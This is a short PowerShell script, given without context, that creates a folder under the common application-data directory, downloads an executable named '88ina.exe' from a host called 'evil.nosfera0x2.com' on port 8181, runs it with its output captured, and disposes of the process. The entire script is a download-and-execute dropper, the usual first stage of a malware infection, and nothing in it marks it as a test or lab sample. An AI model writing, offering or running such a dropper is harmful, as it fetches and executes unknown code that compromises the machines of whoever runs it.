# Define the URL and target path
$url = "http://evil.nosfera0x2.com:8181/88ina.exe"
$targetDirectory = [System.IO.Path]::Combine([System.Environment]::GetFolderPath('CommonApplicationData'), 'DownloadedFiles')
$targetFile = [System.IO.Path]::Combine($targetDirectory, '88ina.exe')

# Create the target directory if it doesn't exist
if (-not (Test-Path -Path $targetDirectory -PathType Container)) {
    New-Item -Path $targetDirectory -ItemType Directory
}

# Download the file
Invoke-WebRequest -Uri $url -OutFile $targetFile

# Execute the downloaded executable
$pinfo = New-Object System.Diagnostics.ProcessStartInfo
$pinfo.FileName = $targetFile
$pinfo.RedirectStandardError = $true
$pinfo.RedirectStandardOutput = $true
$pinfo.UseShellExecute = $false

$p = New-Object System.Diagnostics.Process
$p.StartInfo = $pinfo
$p.Start() | Out-Null
$p.WaitForExit()
$stdout = $p.StandardOutput.ReadToEnd()
$stderr = $p.StandardError.ReadToEnd()

if ($p.ExitCode -ne 0) {
    $res = $stderr
} else {
    $res = $stdout
}

# Clean up (close and dispose of resources)
$p.Close()
$p.Dispose()

